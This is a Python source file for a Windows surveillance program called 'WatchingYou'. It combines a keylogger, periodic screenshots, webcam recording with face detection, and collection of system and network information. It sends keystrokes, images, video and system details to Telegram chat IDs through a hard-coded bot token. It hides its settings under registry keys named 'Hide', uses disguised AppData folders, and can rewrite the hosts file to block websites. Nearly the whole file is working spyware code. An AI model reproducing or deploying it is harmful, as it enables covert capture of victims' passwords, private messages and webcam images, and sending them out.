import socket
import winreg
from pynput.keyboard import Listener  # Escucha eventos del teclado
import os  # Lib para copiar archivos
import ctypes
import sys
import socket  # Verifica internet
import threading  # procesos multihilos
from datetime import datetime  # Devuelve fecha y hora actual
import datetime  # Devuelve fecha y hora actual
import random  # Genera numeros
import telepot  # Telegram API
import string  # Lib genera textos
import time  # Contar segundos
import cv2 # Lib IA
import eel # Entorno gráfico con HTML/ CSS / JS
from shutil import rmtree  # Remove foldes with files
from PIL import ImageGrab  # Take Screenshot

import configparser

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'   # ignore class


class WinRegistry:
    def __init__(self, path):
        self.afterPath = path
        self.HKEY = None
        self.__listHKEY = [
            'HKEY_CLASSES_ROOT',
            'HKEY_CURRENT_USER',
            'HKEY_LOCAL_MACHINE',
            'HKEY_DYN_DATA',
            'HKEY_PERFORMANCE_DATA',
            'HKEY_USERS',
            'HKEY_CURRENT_CONFIG']

        for hkey in self.__listHKEY:
            index = self.afterPath.find(hkey)  # getting boot index
            if index != -1:  # Only if it was successful
                if str(hkey) == 'HKEY_CLASSES_ROOT':
                    self.HKEY = winreg.HKEY_CLASSES_ROOT
                elif str(hkey) == 'HKEY_CURRENT_USER':
                    self.HKEY = winreg.HKEY_CURRENT_USER
                elif str(hkey) == 'HKEY_LOCAL_MACHINE':
                    self.HKEY = winreg.HKEY_LOCAL_MACHINE
                elif str(hkey) == 'HKEY_DYN_DATA':
                    self.HKEY = winreg.HKEY_DYN_DATA
                elif str(hkey) == 'HKEY_PERFORMANCE_DATA':
                    self.HKEY = winreg.HKEY_PERFORMANCE_DATA
                elif str(hkey) == 'HKEY_USERS':
                    self.HKEY = winreg.HKEY_CLASSES_ROOT
                elif str(hkey) == 'HKEY_CURRENT_CONFIG':
                    self.HKEY = winreg.HKEY_CURRENT_CONFIG
                else:
                    print('Error path invalido')
                index = index + len(hkey) + 1  # Index cut
                end = len(self.afterPath)  # End cut
                self.afterPath = self.afterPath[index:end]  # cut path

    def __format_after_path(self):
        afterPath = self.afterPath
        if afterPath != "":
            return afterPath + "\\"
        else:
            return afterPath

    def __create_value(self, type, nameValue, value):
        self.create_key('')
        opened_key = winreg.OpenKey(self.HKEY, self.afterPath, 0, winreg.KEY_ALL_ACCESS)
        winreg.SetValueEx(opened_key, nameValue, 0, type, value)
        opened_key.Close()

    def create_key(self, keyName):
        winreg.CreateKeyEx(self.HKEY, self.__format_after_path() + keyName, 0, winreg.KEY_ALL_ACCESS)

    def delete_key(self, keyName):
        try:
            winreg.DeleteKeyEx(self.HKEY, self.__format_after_path() + keyName, winreg.KEY_ALL_ACCESS, 0)
        except:
            pass

    def read_value(self, nameValue):
        try:
            # Open key
            opened_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, self.afterPath, 0,winreg.KEY_ALL_ACCESS)  # Error if key is emply
            # Create value
            f = winreg.QueryValueEx(opened_key, nameValue)
            print(f[0])
            return f[0]
        except:
            return False

    def set_value_String(self, nameValue, value):
        self.__create_value(winreg.REG_SZ, nameValue, value)

    def set_value_Binary(self, nameValue, value):
        self.__create_value(winreg.REG_BINARY, nameValue, value)

    def set_value_DWORD(self, nameValue, value):
        self.__create_value(winreg.REG_DWORD, nameValue, value)

    def set_value_QWORD(self, nameValue, value):
        self.__create_value(winreg.REG_QWORD, nameValue, value)

    def set_value_MultiString(self, nameValue, value):
        self.__create_value(winreg.REG_MULTI_SZ, nameValue, value)

    def set_value_ExpandableString(self, nameValue, value):
        self.__create_value(winreg.REG_EXPAND_SZ, nameValue, value)

    def delete_value(self, nameValue):
        try:
            # Open key
            opened_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, self.afterPath, 0, winreg.KEY_ALL_ACCESS)  # Error if key is emply
            # Create value
            winreg.DeleteValue(opened_key, nameValue)
        except:
            pass


class Util:
    def create_folder(self, path):
        try:  # Intenta crear la dirección
            os.makedirs(path)
            print("[CreateFolders] Success create folder: " + path)
        except:
            print("[CreateFolders] Folder really exist: " + path)


    def delete_folder(self, folder):
        try:
            rmtree(folder)
            print("[CreateFolders] Success remove folder and files: " + folder)
        except:
            print("[CreateFolders] Mistake while was remove folder and files" + folder)

    def current_time(self):
        T = datetime.datetime.now()
        return T.strftime("%A") + " " + T.strftime("%d") + " de " + T.strftime("%B") + " " + T.strftime(
            "%I") + " " + T.strftime("%M") + " " + T.strftime("%p")

    def random_char(self, number=4):  # Genera letras aleatorias [Longitud según el argumento]
        return ''.join(random.choice(string.ascii_letters) for x in range(number))

    def delete_cache(self, path):
        try:
            os.removedirs(path)
        except:
            pass

    def is_admin(self):
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False

    def split_string(self, n, st):
        lst = ['']
        for i in str(st):
            l = len(lst) - 1
            if len(lst[l]) < n:
                lst[l] += i
            else:
                lst += [i]
        return lst

    def save_file(self, path, text, mode="a"):
        subPath = path[0:path.rfind("\\")]  # Recorta el path, y obtiene el sub path
        self.create_folder(subPath)
        print(subPath)
        file = open(path, mode)
        file.write(text)
        file.close()


class Keylogger:
    def __init__(self):
        self.__buffer = ""
        self.__regeditPath_Telegram = r"Computer\HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\TelegramBot"
        self.__regeditPath_keylogger = r"Computer\HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\Keylogger"
        self.__limit = int(str(WinRegistry(self.__regeditPath_keylogger).read_value('limit')))
        self.__active = int(str(WinRegistry(self.__regeditPath_keylogger).read_value('active')))

    def _send(self, reg_text):
        self.__active = int(str(WinRegistry(self.__regeditPath_keylogger).read_value('active')))
        if self.__active == 1:
            __token = str(WinRegistry(self.__regeditPath_Telegram).read_value('token'))
            __id = WinRegistry(self.__regeditPath_Telegram).read_value('id')
            bot = telepot.Bot(__token)
            for id in __id:
                try:
                    bot.sendMessage(id, reg_text)
                    print("[SEND TelegramBot] Send keylogger to: [ID] = " + str(id))
                except:
                    print("[SEND TelegramBot] there was a mistake when sending the [ID] = " + str(id))
        else:
            pass

    def listen_key(self):
        def _key_min(numberKey):  # Caracteres Comunes // Optimizados
            switcher = {
                # Vocales Minisculas
                "'a'": "a",
                "'e'": "e",
                "'i'": "i",
                "'o'": "o",
                "'u'": "u",
                # Letras  Minusculas
                "'b'": "b",
                "'c'": "c",
                "'d'": "d",
                "'f'": "f",
                "'g'": "g",
                "'h'": "h",
                "'j'": "j",
                "'J'": "J",
                "'k'": "k",
                "'l'": "l",
                "'m'": "m",
                "'n'": "n",
                "'ñ'": "ñ",
                "'p'": "p",
                "'q'": "q",
                "'r'": "r",
                "'s'": "s",
                "'t'": "t",
                "'v'": "v",
                "'w'": "w",
                "'x'": "x",
                "'y'": "y",
                "'z'": "z",
                # Caracteres
                "','": ",",  # ,
                "'.'": ".",  # .
                "'_'": "_",  # _
                "'-'": "-",  # -
                "':'": ":",  #
                # Vocales Mayúsculas
                "'A'": "A",
                "'E'": "E",
                "'I'": "I",
                "'O'": "O",
                "'U'": "U",
                # Letras Mayúsculas
                "'B'": "B",
                "'C'": "C",
                "'D'": "D",
                "'F'": "F",
                "'G'": "G",
                "'H'": "H",
                "'K'": "K",
                "'L'": "L",
                "'M'": "M",
                "'N'": "N",
                "'Ñ'": "Ñ",
                "'P'": "P",
                "'Q'": "Q",
                "'R'": "R",
                "'S'": "S",
                "'T'": "T",
                "'V'": "V",
                "'W'": "W",
                "'X'": "X",
                "'Y'": "Y",
                "'Z'": "Z",
                # Números Standard
                "'1'": "1",
                "'2'": "2",
                "'3'": "3",
                "'4'": "4",
                "'5'": "5",
                "'6'": "6",
                "'7'": "7",
                "'8'": "8",
                "'9'": "9",
                "'0'": "0",
                # Caracteres Especiales
                "'@'": "@",  # @
                "'#'": "#",  # #
                "'*'": "*",  # *
                "'('": "(",  # (
                "')'": ")",  # )
                '"\'"': "'",  # '
                "'\"'": '"',  # "
                "'?'": "?",  # ?
                "'='": "=",  # =
                "'+'": "+",  # +
                "'!'": "!",  # !
                "'}'": "}",  # }
                "'{'": "{",  # {}
                "'´'": "´",  # ´
                "'|'": "|",  # |
                "'°'": "°",  # °
                "'^'": "¬",  # ^
                "';'": ";",  #
                "'$'": "$",  # $
                "'%'": "%",  # %
                "'&'": "&",  # &
                "'>'": ">",  #
                "'<'": "<",  #
                "'/'": "/",  # /
                "'¿'": "¿",  # ¿
                "'¡'": "¡",  # ¡
                "'~'": "~"  #
            }
            return switcher.get(numberKey, "")  # Convierte tecla a un valor legible

        def _key_max(numberKey):  # Botones, comunes // Optimizados
            switcher = {
                "Key.space": " ",  # Espacio
                "Key.backspace": "⋪",  # Borrar
                "Key.enter": "\n",  # Salto de linea
                "Key.tab": "    ",  # Tabulación
                "Key.delete": "❌",  # Suprimir
                # Números
                "<96>": "0",  # 0
                "<97>": "1",  # 1
                "<98>": "2",  # 2
                "<99>": "3",  # 3
                "<100>": "4",  # 4
                "<101>": "5",  # 5
                "<102>": "6",  # 6
                "<103>": "7",  # 7
                "<104>": "8",  # 8
                "<105>": "9",  # 9
                "<181>": "♪",  # Open Music ♪

                # Números Númeral
                "None<96>": "0",  # 0
                "None<97>": "1",  # 1
                "None<98>": "2",  # 2
                "None<99>": "3",  # 3
                "None<100>": "4",  # 4
                "None<101>": "5",  # 5
                "None<102>": "6",  # 6
                "None<103>": "7",  # 7
                "None<104>": "8",  # 8
                "None<105>": "9",  # 9
                # Teclas raras 2
                "['^']": "^",
                "['`']": "`",  #
                "['¨']": "¨",  #
                "['´']": "´",  #
                "<110>": ".",  #
                "None<110>": ".",  #
                "Key.alt_l": " ◀Alt ",  #
                "Key.alt_r": " Alt▶ ",
                "Key.shift_r": " Shift▶ ",
                "Key.shift": " ◀Shift ",
                "Key.ctrl_r": " Ctrl▶ ",  #
                "Key.ctrl_l": " ◀Ctrl ",  #
                "Key.right": "▶",  #
                "Key.left": "◀",  #
                "Key.up": "🔼",  #
                "Key.down": "🔽",  #
                # "'\x16'"  : " [Pegó] ",
                # "'\x18'"  : " [Cortar] ",
                # "'\x03'"  : " [Copiar] ",
                "Key.caps_lock": " 🔒⌨ ",
                "Key.num_lock": " 🔒🔢 ",
                # "Key.media_previous"    : "⏮",
                # "Key.media_next"        : "⏭",
                # "Key.media_play_pause"  : "⏹",
                # "Key.media_volume_mute" : "🔇",
                # "Key.media_volume_up" : "🔊",
                # "Key.media_volume_down" : "🔉",
                "Key.cmd": " ⊞ "
            }
            return switcher.get(numberKey, "")  # Convierte tecla a un valor legible

        # instance Obj Config
        print("[KeyLogger] - Start OK")

        def press(key):
            try:
                if (len(str(key))) <= 3:
                    temp = _key_min(str(key))  # Optimitation process and memory
                else:
                    temp = _key_max(str(key))  # Optimitation process and memory
                self.__buffer = self.__buffer + temp  # save keylogger in variable
                print("    " + str(key) + " <= [key press]=> " + temp)
                print(self.__buffer)

                if len(self.__buffer) >= self.__limit:
                    self.__limit = int(str(WinRegistry(self.__regeditPath_keylogger).read_value('limit')))
                    print("[KEYLOGGER] Reached or exceeded the limit  => " + str(len(self.__buffer)))
                    self._send(self.__buffer)
                    self.__buffer = ""
                else:
                    print("[KEYLOGGER] Current text length  => " + str(len(self.__buffer)))
            except:
                print("[KEYLOGGER] there was a mistake getting key ")

        with Listener(on_press=press) as listener:
            listener.join()


class Screenshot:
    def __init__(self):
        self.__regeditPath_Telegram = r"Computer\HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\TelegramBot"
        self.__regeditPath_screenshot = r"Computer\HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\Screenshot"
        self.__path = str(WinRegistry(self.__regeditPath_screenshot).read_value('path'))
        self.__interval = WinRegistry(self.__regeditPath_screenshot).read_value('interval_seconds')
        self.__active = int(str(WinRegistry(self.__regeditPath_screenshot).read_value('active')))
        self.__username = str(WinRegistry(r"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide").read_value('username'))

    def _delete(self, name):
        try:
            os.remove(self.__path + name)
            print("[ScreenShot] Delete Sucess")
        except:
            print("[ScreenShot] There was a mistake while erasing file")

    def send(self):
        # Crear carpeta
        while True:
            if self.__active == 1:
                try:
                    __token = str(WinRegistry(self.__regeditPath_Telegram).read_value('token'))
                    __id = WinRegistry(self.__regeditPath_Telegram).read_value('id')
                    name = self.__username + " " + Util().current_time() + " " + Util().random_char(5) + ".png"
                    print("[Screenshot] File name: " + name)

                    ImageGrab.grab().save(self.__path + "\\" + name)
                    print("[ScreenShot] Take and save screenshot")
                    bot = telepot.Bot(__token)
                    for id in __id:
                        try:
                            bot.sendChatAction(id, 'upload_photo')
                            bot.sendDocument(id, open(self.__path + "\\" + name, 'rb'))
                            print("[SEND ScreenShot] Send keylogger to: [ID] " + str(id))
                        except:
                            print("[SEND ScreenShot] there was a mistake when sending the [ID] " + str(id))
                    self._delete(name)
                except:
                    pass
            else:
                pass
            self.__interval = WinRegistry(self.__regeditPath_screenshot).read_value('interval_seconds')
            self.__active = int(str(WinRegistry(self.__regeditPath_screenshot).read_value('active')))
            time.sleep(self.__interval)


class WebsiteBlock:
    def __init__(self):
        self.registry = r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\WebsiteBlock'
        self.hostsPath = str(WinRegistry(self.registry ).read_value('path'))
        self.hostsTextOriginal = str(WinRegistry(self.registry ).read_value('host_original'))
        self.listWebs =  str(WinRegistry(self.registry ).read_value('list_webs'))

    def __read_file(self, path):
        try:
            content = ""
            file = open(path, "r")
            for l in file.readlines():
                content += l
            file.close()
            return content
        except:
            print('Hubo un error al leer: '+ path)
            pass

    def __write_file(self, text, split=True, type="a"):
        try:
            file = open(self.hostsPath, type)
            try:
                for t in text.split("\n"):
                    file.write("\n127.0.0.1    " + t) if split else file.write(t + "\n")
            except:
                print("Falló el split")
                # file.write(text)
            file.close()
        except:
            print('No tienes los permisos necesario o no se pudo abrir el archivo')

    def __rewrite_file(self, text):
        self.__write_file(text, False, "w")
        print("Se restauró archivo Hosts File")

    def __delete_file(self, path):
        try:
            os.remove(path)
        except:
            pass

    def block(self):
        print("Se bloquearon las siguientes paginas webs:")
        # webs = self.__read_file(self.pathListWeb)
        webs = self.listWebs
        print(webs)
        self.__write_file(webs)

    def unlock(self):
        self.__rewrite_file(self.hostsTextOriginal)

    def reset(self):
        self.unlock()


class PCInformation:
    def __init__(self):
        pass

    @staticmethod
    def __CMD_command(title, command):
        response = title + "\n" + Util().current_time()+"\n"
        lines = os.popen(command)
        for line in lines:
            line.replace('\n\n', '\n')
            response += line
        return response

    def __display_dns(self):
        return self.__CMD_command(
            title="DNS Display Information",
            command="ipconfig /displaydns")

    def __ip_config(self):
        return self.__CMD_command(
            title="Information: IP Config /all",
            command="ipconfig /all")

    def __system_info(self):
        return self.__CMD_command(
            title="Information: System",
            command="systeminfo")

    def __driver_info(self):
        return self.__CMD_command(
            title="Information: Driver Information",
            command="DRIVERQUERY")

    def __taks_list(self):
        return self.__CMD_command(
            title="Information: Taks List",
            command="TASKLIST")

    def __service_active(self):
        return self.__CMD_command(
            title="Information: Services active",
            command="net start")

    def __red_info(self):
        def internalIP():
            internal_ip = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            internal_ip.connect(('google.com', 0))
            return internal_ip.getsockname()[0]

        response = "Information: RED Info\n"
        lines = os.popen('arp -a -N ' + internalIP())
        for line in lines:
            line.replace('\n\n', '\n')
            response += line
        return response

    def send(self):
        while (True):
            if str(WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\PCInformation').read_value('active')) == 1:
                bot = telepot.Bot(
                    str(WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\TelegramBot').read_value('token')))
                for id in WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\TelegramBot').read_value('id'):

                    data = {
                        "Información del DNS": self.__display_dns(),
                        "Información de la RED": self.__red_info(),
                        "Configuración del IP": self.__ip_config(),
                        "Información del sistema": self.__system_info(),
                        "Información de los controladores": self.__driver_info(),
                        "Programas ejecutandose": self.__taks_list(),
                        "Servicios ejecutandose": self.__service_active()
                    }
                    paths = []
                    for name, value in data.items():
                        path = str(WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\PCInformation').read_value(
                            'path')) + '\\' + name + '.txt'
                        paths.append(path)
                        Util().save_file(path, value)

                        bot.sendChatAction(id, 'typing')
                        bot.sendDocument(id, open(path, 'rb'))
                        # time.sleep(1)
                        os.remove(path)

            time.sleep(int(WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\PCInformation').read_value('interval')))


class WebCam_IA:
    def __init__(self):
        self.frontalFacePath = "haarcascade_frontalface_default.xml"  # Archivo clasificador
        self.eyesPath = "haarcascade_eye.xml"  # Archivo clasificador
        self.path_video = str(WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\WebCam').read_value('path'))
        self.extension = str(WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\WebCam').read_value('extension'))

    def __get_capture_webcam(self):
        try:
            print('Tratando de obtener WebCam [0]')
            return cv2.VideoCapture(0)
        except:
            try:
                print('Tratando de obtener WebCam [1]')
                return cv2.VideoCapture(1)
            except:
                pass
            print('No se puedo obtener ambas camaras')
            return False

    def __trained_file_face(self):
        try:
            return cv2.CascadeClassifier(self.frontalFacePath)
        except:
            return False

    def __trained_file_eyes(self):
        try:
            return cv2.CascadeClassifier(self.eyesPath)
        except:
            return False

    def upload_video(self, name):
        bot = telepot.Bot(str(WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\TelegramBot').read_value('token')))
        for id in str(WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\TelegramBot').read_value('id')):
            try:
                bot.sendChatAction(id, 'upload_photo')
                bot.sendVideo(id, open(name, 'rb'))
                print("[SEND WebCam] Send Video to: [ID] " + str(id))
            except:
                print("[SEND WebCam Video] there was a mistake when sending the [ID] " + str(id))

    def start(self):

        faceClassif = self.__trained_file_face()
        eyesClassif = self.__trained_file_eyes()
        num = 1
        def init(num):
            videoPath = self.path_video + str(num) + self.extension
            cap = cv2.VideoCapture(0)  # self.get_capture_webcam()
            outVideo = cv2.VideoWriter(videoPath, cv2.VideoWriter_fourcc(*'FMP4'), 20.0, (int(cap.get(3)), int(cap.get(4))))
            if cap != False and faceClassif != False and eyesClassif != False:
                while cap.isOpened():
                    ret, frame = cap.read()  # Obtiene frames // ret == true si hay video
                    gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)
                    faces = faceClassif.detectMultiScale(gray,
                                                         scaleFactor=1.05,  # original 1.3,  # Reducción de imagen
                                                         minNeighbors=5)  # 5    # Espeficica el número mínimo de cuadros delimitadores
                    eyes = eyesClassif.detectMultiScale(gray,
                                                        scaleFactor=1.05,
                                                        minNeighbors=5)
                    if ret == True:
                        for x, y, w, h in faces:
                            cv2.rectangle(frame,
                                          (x, y),
                                          (x + w, y + h),
                                          (0, 0, 255),
                                          2)  # original 2
                        for x, y, w, h in eyes:
                            cv2.rectangle(frame,
                                          (x, y),
                                          (x + w, y + h),
                                          (0, 255, 0),
                                          2)  # original 2

                        cv2.imshow('WebCam IA detecction', frame)
                        outVideo.write(frame)
                        if os.path.getsize(videoPath) >= 1000000:
                            outVideo.release()
                            print('Se detuvo el video con nombre: ' + videoPath )
                            self.upload_video(videoPath)
                            num = num +1
                            init(num)
                            break
                        print(os.path.getsize(videoPath))
                        #if cv2.waitKey(1) & 0xFF == ord('q'):
                        #    break
                cap.release()
                #outVideo.release()
                cv2.destroyAllWindows()
            else:
                print('No se puedo acceder a la webcam o al archivo entrenado')
        init(num)


class WatchingYou:
    def write_reg_init(self):
        if self.__check_reg() == False:
            ## Escrbiir en el registro
            pass

    def check_id(self, fullname, chat_id):
        token = str(WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\TelegramBot').read_value('token'))
        bot = telepot.Bot(token)
        for id in chat_id:
            try:
                bot.sendMessage(id, "test send")
                print("ID and Token Success " + str(id))
                self.__write_id(fullname, chat_id)
                return True
            except:
                print("Was there mistake in ID: " + str(id) + " or Token: " + str(token))
                return False

    def __check_reg(self):
        return WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide').read_value('fullname')

    def __write_id(self, fullname, chat_id):
        WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide').set_value_String('fullname', fullname)
        WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\TelegramBot').set_value_MultiString('id',chat_id)

    def write_reg_complete_init(self):

        def write_keylogger_reg():
            reg = WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\Keylogger')
            reg.set_value_DWORD('active', 1)
            reg.set_value_DWORD('limit', 15)
            print(
                f"{bcolors.BOLD}{bcolors.OKBLUE}Keylogger: {bcolors.ENDC}" + f"{bcolors.OKGREEN} Writting in Registry... OK {bcolors.ENDC}")
        def write_screenshot_reg():
            reg = WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\Screenshot')
            reg.set_value_DWORD('active', 1)
            reg.set_value_DWORD('interval_seconds', 10)
            reg.set_value_ExpandableString('path', 'C:\\Users\\' +str(os.getlogin()) + r'\AppData\Local\Microsoft\Office\16.0\Floodgate\temp')
            print(
                f"{bcolors.BOLD}{bcolors.OKBLUE}Screenshot: {bcolors.ENDC}" + f"{bcolors.OKGREEN} Writting in Registry... OK {bcolors.ENDC}")
        def write_telegram_bot_reg():
            reg = WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\TelegramBot')
            reg.set_value_MultiString('id', "")
            reg.set_value_String('token', "1479089003:AAHyp-gXXezKm130WHwpMSFNOAZWJQME-Vk")
            print(f"{bcolors.BOLD}{bcolors.OKBLUE}"
                  f"TelegramBot: {bcolors.ENDC}" + f"{bcolors.OKGREEN} Writting in Registry... OK {bcolors.ENDC}")
        def write_info_reg():

            reg = WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide')
            reg.set_value_ExpandableString('sub_path', 'C:\\Users\\' +str(os.getlogin()) + r'\AppData\Local\Microsoft\Windows\Shell\temp')
            reg.set_value_ExpandableString('name_software','WatchingYou.exe')
            reg.set_value_ExpandableString('path', 'C:\\Users\\' +str(os.getlogin()) + r'\AppData\Local\Microsoft\Windows\Shell\temp' +'\\'+'WatchingYou.exe')
            reg.set_value_String('username',str(os.getlogin()) )

            print(f"{bcolors.BOLD}{bcolors.OKBLUE}"
                  f"info: {bcolors.ENDC}" + f"{bcolors.OKGREEN} Writting in Registry... OK {bcolors.ENDC}")
        def write_website_reg():

            reg = WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\WebsiteBlock')
            reg.set_value_DWORD('active', 1)
            reg.set_value_MultiString('host_original',
                                      ["# Copyright (c) 1993-2009 Microsoft Corp."
                                          , "#"
                                          , "# This is a sample HOSTS file used by Microsoft TCP/IP for Windows."
                                          , "#"
                                          , "# This file contains the mappings of IP addresses to host names. Each"
                                          , "# entry should be kept on an individual line. The IP address should"
                                          , "# be placed in the first column followed by the corresponding host name."
                                          , "# The IP address and the host name should be separated by at least one"
                                          , "# space."
                                          , "#"
                                          , "# Additionally, comments (such as these) may be inserted on individual"
                                          , "# lines or following the machine name denoted by a '#' symbol."
                                          , "#"
                                          , "# For example:"
                                          , "#"
                                          , "#      102.54.94.97     rhino.acme.com          # source server"
                                          , "#       38.25.63.10     x.acme.com              # x client host"
                                          , "# localhost name resolution is handled within DNS itself."
                                          , "#	127.0.0.1       localhost"
                                          , "#	::1             localhost"])

            reg.set_value_MultiString('list_webs',
                                      ["www.google.com"
                                          , "www.wikipedia.com"
                                          , "www.bing.com"
                                          , "www.es.yahoo.com"
                                          , "www.altavista.com"
                                          , "www.ask.com"
                                          , "www.gigablast.com"
                                          , "www.excite.com"
                                          , "www.lycos.com"
                                          , "www.wolframalpha.com"
                                          , "www.quandl.com"
                                          , "www.factbites.com"
                                          , "ww.nationmaster.com"
                                          , "www.facebook.com"
                                          , "www.Instagram.com"
                                          , "www.twiter.com"
                                          , "www.tiktok.com"
                                          , "www.youtube.com"
                                          , "www.wechat.com"
                                          , "www.linkedln.com"
                                          , "www.skype.com"
                                          , "www.snapchat.com"
                                          , "www.pinterest.com"
                                          , "www.whatsapp.com"
                                          , "www.reddit.com"])

            reg.set_value_String('path', r'C:\Windows\System32\drivers\etc\hosts')

            print(f"{bcolors.BOLD}{bcolors.OKBLUE}"
                  f"info: {bcolors.ENDC}" + f"{bcolors.OKGREEN} Writting in Registry... OK {bcolors.ENDC}")
        def webcam_info_reg():
            reg = WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\WebCam')
            reg.set_value_DWORD('active', 1)
            reg.set_value_String('extension', '.mp4')
            reg.set_value_String('path', r'C:\Users\Public\temp\watching_you\webcam')
        def webcam_pc_information_reg():
            reg = WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\PCInformation')
            reg.set_value_DWORD('active', 1)
            reg.set_value_String('interval', 350)
            reg.set_value_String('path', r'C:\Users\Public\temp\watching_you\pc_information')

        webcam_pc_information_reg()
        write_website_reg()
        write_keylogger_reg()
        write_screenshot_reg()
        write_telegram_bot_reg()
        write_info_reg()
        webcam_info_reg()

    def __active_or_disable(self, value):
        WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\Keylogger').set_value_DWORD('active',  value)
        WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\Screenshot').set_value_DWORD('active',  value)
        WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\WebsiteBlock').set_value_DWORD('active',  value)
        WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\WebCam').set_value_DWORD('active', value)
        WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\PCInformation').set_value_DWORD('active', value)

    def active(self):
        self.__active_or_disable(1)

    def disabled(self):
        self.__active_or_disable(0)



if __name__ == '__main__':
    
    if not WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide').read_value('fullname'):
        print('no existe, crear datos en el registro')
        WatchingYou().write_reg_complete_init()

    else:
        print('si se encontró el username ')

    folders = [
        str(WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide').read_value('sub_path')),
        str(WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\Screenshot').read_value('path')),
        str(WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\WebCam').read_value('path')),
        str(WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\PCInformation').read_value('path')),
    ]
    for f in folders:
        Util().delete_folder(f)  # Remove foldes and files // Cache
        Util().create_folder(f)  # Create folders for cache


    eel.init('web')     # Nombre de la carpeta

    @eel.expose
    def start_software():
        print('El software está empezando')
        print("Is Admin?: Admin Success" if Util().is_admin() else "Is Admin?: Admin Failed")

        if Util().is_admin():
            #threading.Thread(target=WebsiteBlock().block).start() # Bloquear Webs
            #threading.Thread(target=WebsiteBlock().reset()).start()   # Desbloquear Webs
            pass
        threading.Thread(target=PCInformation().send).start()
        threading.Thread(target=Keylogger().listen_key).start()
        threading.Thread(target=Screenshot().send).start()
        WebCam_IA().start()
        WatchingYou().active()


        # Crea Registros
        # Modificar Registro

        return True

    @eel.expose
    def stop___(): # Detiene todo el proceso

        # vuelve al inicio del software, tambien detener
        WatchingYou().disabled()
        if Util().is_admin():
            threading.Thread(target=WebsiteBlock().reset()).start()   # Desbloquear Webs
        # Modificar registro
        return ""

    @eel.expose
    def start___():  # Inicia todo el proceso
        # se detiene el software confirmado
        WatchingYou().disabled()
        if Util().is_admin():
            threading.Thread(target=WebsiteBlock().reset()).start()  # Desbloquear Webs
        return ""

    @eel.expose
    def exit___(self):  # Inicia todo el proceso
        #eel._shutdown
        print('detener??')
        # Cierra software
        os._exit(1)
        return ""

    @eel.expose
    def retorno(d):  # Inicia todo el proceso
        WatchingYou().active()
        print('se volvieron activar loss ervicios')
        return "true"

    @eel.expose
    def check_id(chat_id, fullname):  # Inicia todo el proceso
        WatchingYou().write_reg_init()
        print(chat_id)
        return WatchingYou().check_id(fullname, [chat_id])

    eel.start('index.html',  size=(950, 600))